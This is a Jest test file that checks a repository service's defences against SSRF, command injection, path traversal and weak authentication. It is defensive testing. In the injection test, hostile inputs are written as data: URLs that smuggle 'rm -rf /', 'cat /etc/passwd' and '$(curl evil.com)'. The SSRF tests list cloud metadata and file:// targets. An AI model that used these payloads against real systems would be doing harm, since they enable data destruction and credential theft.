import { RepositorySecurityService } from '../src/services/repository/RepositorySecurityService';
import { authenticate, requireRole } from '../src/middleware/auth';
import { config, validateProductionConfig } from '../src/config/env';
import { GitHubIntegrationService } from '../src/services/github/GitHubIntegrationService';
import { RepositoryConnection } from '../src/models/RepositoryConnection';

describe('RepositorySecurityService (SSRF, Injection & Path Traversal)', () => {
  describe('SSRF Protection', () => {
    it('should approve valid public HTTPS repository URLs', () => {
      const validUrls = [
        'https://github.com/torvalds/linux.git',
        'https://github.com/facebook/react',
        'https://gitlab.com/gitlab-org/gitlab.git',
        'https://bitbucket.org/atlassian/sample-repo.git',
      ];

      for (const url of validUrls) {
        const result = RepositorySecurityService.validateUrl(url);
        expect(result.isValid).toBe(true);
        expect(result.sanitizedUrl).toBeDefined();
        expect(result.error).toBeUndefined();
      }
    });

    it('should block localhost and loopback IP addresses', () => {
      const loopbacks = [
        'https://localhost/repo.git',
        'https://localhost:8080/my-repo',
        'https://127.0.0.1/project.git',
        'https://127.0.0.254/secret.git',
        'https://[::1]/project.git',
      ];

      for (const url of loopbacks) {
        const result = RepositorySecurityService.validateUrl(url);
        expect(result.isValid).toBe(false);
        expect(result.error).toMatch(/restricted local or internal network host|SSRF/i);
      }
    });

    it('should block RFC1918 private network CIDRs', () => {
      const privateUrls = [
        'https://10.0.0.1/internal.git',
        'https://10.255.255.255/admin.git',
        'https://172.16.0.5/infra.git',
        'https://172.31.255.255/repo.git',
        'https://192.168.1.1/corp.git',
        'https://192.168.100.50/dev.git',
      ];

      for (const url of privateUrls) {
        const result = RepositorySecurityService.validateUrl(url);
        expect(result.isValid).toBe(false);
        expect(result.error).toMatch(/restricted local or internal network host|SSRF/i);
      }
    });

    it('should block cloud metadata IP endpoints (AWS, GCP, Azure)', () => {
      const metadataUrls = [
        'https://169.254.169.254/latest/meta-data',
        'https://169.254.169.254/computeMetadata/v1/',
        'https://metadata.google.internal/computeMetadata/v1/',
      ];

      for (const url of metadataUrls) {
        const result = RepositorySecurityService.validateUrl(url);
        expect(result.isValid).toBe(false);
        expect(result.error).toMatch(/restricted local or internal network host|SSRF/i);
      }
    });

    it('should block non-HTTPS unsupported protocols', () => {
      const invalidProtocols = [
        'file:///etc/passwd',
        'ftp://ftp.example.com/repo.git',
        'gopher://gopher.example.com/item',
        'ssh://git@github.com/org/repo.git',
        'ldap://ldap.example.com/repo',
      ];

      for (const url of invalidProtocols) {
        const result = RepositorySecurityService.validateUrl(url);
        expect(result.isValid).toBe(false);
        expect(result.error).toMatch(/Only secure HTTPS/i);
      }
    });
  });

  describe('Command Injection Protection', () => {
    it('should reject URLs containing shell injection meta-characters', () => {
      const injectionAttempts = [
        'https://github.com/org/repo.git; rm -rf /',
        'https://github.com/org/repo.git && whoami',
        'https://github.com/org/repo.git | cat /etc/passwd',
        'https://github.com/org/`touch hacked`.git',
        'https://github.com/org/$(curl evil.com).git',
      ];

      for (const url of injectionAttempts) {
        const result = RepositorySecurityService.validateUrl(url);
        expect(result.isValid).toBe(false);
        expect(result.error).toMatch(/prohibited.*characters/i);
      }
    });
  });

  describe('Path Traversal Safeguards', () => {
    it('should detect path traversal patterns', () => {
      const baseDir = '/tmp/safe-workspace';
      expect(RepositorySecurityService.isSafeWorkspacePath(baseDir, '/tmp/safe-workspace/analysis-123')).toBe(true);
      expect(RepositorySecurityService.isSafeWorkspacePath(baseDir, '/tmp/safe-workspace/sub/dir')).toBe(true);

      // Traversal escapes
      expect(RepositorySecurityService.isSafeWorkspacePath(baseDir, '/tmp/other-workspace')).toBe(false);
      expect(RepositorySecurityService.isSafeWorkspacePath(baseDir, '/tmp/safe-workspace/../escape')).toBe(false);
      expect(RepositorySecurityService.isSafeWorkspacePath(baseDir, '/etc/passwd')).toBe(false);
    });
  });

  describe('Authentication & Authorization Security Controls', () => {
    it('should reject requests with expired tokens', () => {
      const req: any = { headers: { authorization: 'Bearer eyJhbGciOiJIUzI1NiJ9.expired_token_data' } };
      const res: any = {
        status: jest.fn().mockReturnThis(),
        json: jest.fn(),
      };
      const next = jest.fn();

      authenticate(req, res, next);
      expect(res.status).toHaveBeenCalledWith(401);
      expect(res.json).toHaveBeenCalledWith(
        expect.objectContaining({
          success: false,
          error: expect.objectContaining({ code: 'UNAUTHORIZED' }),
        })
      );
      expect(next).not.toHaveBeenCalled();
    });

    it('should reject malformed or truncated tokens', () => {
      const req: any = { headers: { authorization: 'Bearer 123' } };
      const res: any = {
        status: jest.fn().mockReturnThis(),
        json: jest.fn(),
      };
      const next = jest.fn();

      authenticate(req, res, next);
      expect(res.status).toHaveBeenCalledWith(401);
      expect(res.json).toHaveBeenCalledWith(
        expect.objectContaining({
          success: false,
          error: expect.objectContaining({ code: 'UNAUTHORIZED' }),
        })
      );
      expect(next).not.toHaveBeenCalled();
    });

    it('should reject unauthenticated requests in production mode', () => {
      const originalEnv = config.nodeEnv;
      (config as any).nodeEnv = 'production';
      (config as any).demoMode = false;

      const req: any = { headers: {} };
      const res: any = {
        status: jest.fn().mockReturnThis(),
        json: jest.fn(),
      };
      const next = jest.fn();

      authenticate(req, res, next);
      expect(res.status).toHaveBeenCalledWith(401);
      expect(res.json).toHaveBeenCalledWith(
        expect.objectContaining({
          success: false,
          error: expect.objectContaining({ code: 'UNAUTHORIZED' }),
        })
      );
      expect(next).not.toHaveBeenCalled();

      (config as any).nodeEnv = originalEnv;
      (config as any).demoMode = true;
    });

    it('should enforce role-based access restrictions', () => {
      const req: any = { user: { id: 'usr-1', email: 'v@debtlens.ai', role: 'viewer' } };
      const res: any = {
        status: jest.fn().mockReturnThis(),
        json: jest.fn(),
      };
      const next = jest.fn();

      const adminGuard = requireRole(['admin']);
      adminGuard(req, res, next);
      expect(res.status).toHaveBeenCalledWith(403);
      expect(res.json).toHaveBeenCalledWith(
        expect.objectContaining({
          success: false,
          error: expect.objectContaining({ code: 'FORBIDDEN' }),
        })
      );
      expect(next).not.toHaveBeenCalled();
    });
  });

  describe('Webhook Signature Verification', () => {
    it('should accept valid HMAC-SHA256 signatures and reject tampered payloads', () => {
      const secret = 'test-webhook-secret-key-12345';
      const payload = JSON.stringify({ action: 'push', ref: 'refs/heads/main' });
      const crypto = require('crypto');
      const hmac = crypto.createHmac('sha256', secret);
      const validSignature = `sha256=${hmac.update(payload).digest('hex')}`;

      expect(GitHubIntegrationService.verifyWebhookSignature(payload, validSignature, secret)).toBe(true);

      // Tampered payload
      const tamperedPayload = JSON.stringify({ action: 'push', ref: 'refs/heads/master' });
      expect(GitHubIntegrationService.verifyWebhookSignature(tamperedPayload, validSignature, secret)).toBe(false);

      // Invalid signature format
      expect(GitHubIntegrationService.verifyWebhookSignature(payload, 'invalid-signature', secret)).toBe(false);
      expect(GitHubIntegrationService.verifyWebhookSignature(payload, undefined, secret)).toBe(false);
    });
  });

  describe('Secret Exposure Prevention', () => {
    it('should configure webhookSecret with select: false in RepositoryConnection schema', () => {
      const pathConfig = (RepositoryConnection.schema.paths as any)['webhookSecret'];
      expect(pathConfig).toBeDefined();
      expect(pathConfig.options.select).toBe(false);
    });
  });

  describe('Production Environment Startup Validation', () => {
    const originalEnv = { ...process.env };
    const originalConfigEnv = config.nodeEnv;

    afterEach(() => {
      process.env = { ...originalEnv };
      (config as any).nodeEnv = originalConfigEnv;
    });

    it('should pass cleanly when valid production config is supplied', () => {
      (config as any).nodeEnv = 'production';
      process.env.JWT_SECRET = 'a_secure_production_secret_with_32_characters_minimum!';
      process.env.CORS_ORIGIN = 'https://app.debtlens.ai';
      process.env.MONGODB_URI = 'mongodb+srv://user:pass@cluster.mongodb.net/debtlens';

      expect(() => validateProductionConfig()).not.toThrow();
    });

    it('should fail startup in production when JWT_SECRET is default or short', () => {
      (config as any).nodeEnv = 'production';
      process.env.JWT_SECRET = 'short_secret';
      process.env.CORS_ORIGIN = 'https://app.debtlens.ai';
      process.env.MONGODB_URI = 'mongodb+srv://user:pass@cluster.mongodb.net/debtlens';

      expect(() => validateProductionConfig()).toThrow(/JWT_SECRET must be configured/);
    });

    it('should fail startup in production when CORS_ORIGIN allows localhost or wildcard', () => {
      (config as any).nodeEnv = 'production';
      process.env.JWT_SECRET = 'a_secure_production_secret_with_32_characters_minimum!';
      process.env.CORS_ORIGIN = '*';
      process.env.MONGODB_URI = 'mongodb+srv://user:pass@cluster.mongodb.net/debtlens';

      expect(() => validateProductionConfig()).toThrow(/CORS_ORIGIN must specify explicit production origin/);
    });

    it('should fail startup in production when MONGODB_URI is missing', () => {
      (config as any).nodeEnv = 'production';
      process.env.JWT_SECRET = 'a_secure_production_secret_with_32_characters_minimum!';
      process.env.CORS_ORIGIN = 'https://app.debtlens.ai';
      delete process.env.MONGODB_URI;

      expect(() => validateProductionConfig()).toThrow(/MONGODB_URI must be provided/);
    });
  });
});
